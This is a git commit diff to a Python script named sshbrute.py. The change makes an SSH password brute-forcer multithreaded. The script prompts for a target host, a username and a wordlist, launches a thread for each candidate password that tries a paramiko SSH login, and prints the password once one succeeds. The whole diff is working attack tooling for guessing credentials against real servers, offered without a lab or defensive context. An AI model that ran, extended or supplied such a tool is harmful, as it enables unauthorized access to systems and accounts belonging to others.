275b1d12779cf41998b2b444bf751b1ddc85355e
onebottlekick <gksqudcks97@gmail.com>
2021-08-15 23:51:24 +0900

    ssh brute-force attack using threading

--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -3,20 +3,24 @@ import os
 import socket
 import paramiko
 import termcolor
+import threading
+import time
 
-def ssh_connect(password, code=0):
+stop_flag = 0
+
+def ssh_connect(password):
+    global stop_flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
         ssh.connect(host, port=22, username=username, password=password)
-    except paramiko.AuthenticationException:
-        code = 1
-    except socket.error as e:
-        code = 2
-
+        stop_flag = 1
+        print(termcolor.colored((f'[+] Found Password: {password}, For Account: {username}'), 'green'))
+    except:
+        print(termcolor.colored((f'[-] Incorrect Login: {password}'), 'red'))
     ssh.close()
-    return code
+
 
 
 host = input('[+] Target Address: ')
@@ -28,19 +32,14 @@ if os.path.exists(input_file) == False:
     print('[!!] That File/Path Doesnt Exist')
     sys.exit(1)
 
+print(f'* * * Starting Threaded SSH Bruteforce On {host} With Account: {username} * * *')
+
 with open(input_file, 'r') as file:
     for line in file.readlines():
+        if stop_flag == 1:
+            t.join()
+            exit()
         password = line.strip()
-        try:
-            response = ssh_connect(password)
-            if response == 0:
-                print(termcolor.colored((f'[+] Found Password: {password}, For Account: {username}'), 'green'))
-                break
-            elif response == 1:
-                print(f'[-] Incorrect Login: {password}')
-            elif response == 2:
-                print('[!!] Cant Connect')
-                sys.exit(1)
-        except Exception as e:
-            print(e)
-            pass
+        t = threading.Thread(target=ssh_connect, args=(password, ))
+        t.start()
+        time.sleep(0.5)
